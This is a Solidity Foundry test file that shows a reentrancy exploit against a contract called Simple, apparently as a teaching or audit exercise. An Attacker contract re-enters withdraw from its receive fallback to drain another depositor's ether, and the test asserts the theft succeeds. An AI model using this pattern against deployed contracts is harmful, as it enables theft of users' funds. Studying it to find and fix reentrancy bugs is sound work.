//SPDX-License_Identifier: GPL-3.0

import {Simple} from "../../src/Reentrancy/Simple.sol";
import {Test, console} from "lib/forge-std/src/Test.sol";

pragma solidity 0.8.18;

contract SimpleTest is Test {
    Simple victim;
    Attacker attacker;
    address victim1 = makeAddr("victim1");

    function setUp() public {
        victim = new Simple();
        attacker = new Attacker(address(victim));
        vm.deal(victim1, 1 ether);
        vm.deal(address(attacker), 0.1 ether);
    }

    function test_simple() public {
        vm.prank(victim1);
        Simple(victim).deposit{value: 0.3 ether}();
        vm.prank(address(attacker));
        attacker.attack();
        assert(address(attacker).balance == 0.4 ether);
    }
}

contract Attacker {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function attack() external {
        Simple(victim).deposit{value: 0.1 ether}();
        Simple(victim).withdraw();
    }

    receive() external payable {
        try Simple(victim).withdraw() {} catch {}
    }
}
